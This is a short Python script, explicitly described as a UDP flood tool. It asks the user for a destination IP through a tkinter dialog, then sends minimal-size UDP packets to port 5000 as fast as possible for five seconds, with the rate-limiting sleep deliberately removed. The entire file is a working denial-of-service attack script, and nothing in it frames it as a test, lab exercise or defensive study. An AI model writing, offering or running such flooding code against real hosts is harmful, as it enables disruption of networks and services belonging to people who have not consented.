import socket
import time
import tkinter as tk
from tkinter import simpledialog

# UDP flood script with dynamic target IP entry

def get_target_ip():
    # Setup a simple GUI to get the target IP
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    ip_address = simpledialog.askstring("Input", "Enter destination IP address:", parent=root)
    root.destroy()
    return ip_address

def udp_flood(target_ip, port, packet_size, duration):
    # Setup the UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b'x' * packet_size  # Single byte payload for minimal packet size

    # Calculate the end time
    end_time = time.time() + duration

    print(f"Starting UDP flood to {target_ip}:{port} at maximum possible rate for {duration} seconds.")

    try:
        while time.time() < end_time:
            sock.sendto(message, (target_ip, port))
            # Removed the sleep call to maximize packet rate
    except Exception as e:
        print(f"Error during UDP flood: {e}")
    finally:
        sock.close()

    print("UDP flood completed.")

if __name__ == "__main__":
    target_ip = get_target_ip()  # Get the target IP from the user input
    port = 5000  # Example port
    packet_size = 1  # Minimal packet size to maximize number of packets
    duration = 5  # Duration in seconds

    if target_ip:
        udp_flood(target_ip, port, packet_size, duration)
    else:
        print("No destination IP address provided.")
